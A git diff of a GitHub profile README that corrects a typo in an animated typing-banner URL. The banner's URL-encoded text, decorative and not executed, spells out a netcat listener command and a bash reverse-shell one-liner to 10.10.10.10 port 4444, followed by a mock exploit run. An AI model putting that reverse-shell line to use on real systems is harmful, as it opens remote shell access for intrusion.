@@ -2,7 +2,7 @@
 
 <p align="left"> <img src="https://komarev.com/ghpvc/?username=t-crypt&label=Profile%20views&color=0e75b6&style=flat" alt="t-crypt" /> </p>
 
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4000&pause=500&color=29E8F7&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BT-Crpyt%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261;T-Crypt%40profile%3A~%24+.%2Fexploit.py;......................................................................................................;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%24whoami;T-Crypt" alt="Typing SVG" /></a>
+<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4000&pause=500&color=29E8F7&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BT-Crypt%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261;T-Crypt%40profile%3A~%24+.%2Fexploit.py;......................................................................................................;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%24whoami;T-Crypt" alt="Typing SVG" /></a>
 
 &nbsp;
 <!--💬GREETINGSTITLE / FONTS: https://www.thefancytext.com/ and then paste on 🌐WEBSITE: https://github.com/denvercoder1/readme-typing-svg -->
